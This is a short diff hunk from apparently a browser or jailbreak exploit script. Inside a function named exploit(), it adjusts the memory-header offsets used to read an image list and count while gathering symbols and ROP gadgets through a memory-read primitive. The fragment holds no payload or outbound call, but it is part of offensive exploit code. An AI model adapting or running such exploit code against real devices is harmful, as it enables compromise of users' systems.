@@ -708,8 +708,8 @@ function exploit(){
        
         var syms = {};
         var gadgets = {};
-        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x1c)));
-        var nimgs = memory.u32(Add(hdr, 0x20));
+        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x28)));
+        var nimgs = memory.u32(Add(hdr, 0x1c));
         alert(nimgs + "n")
         for(var i = 0; i < nimgs; ++i)
         {
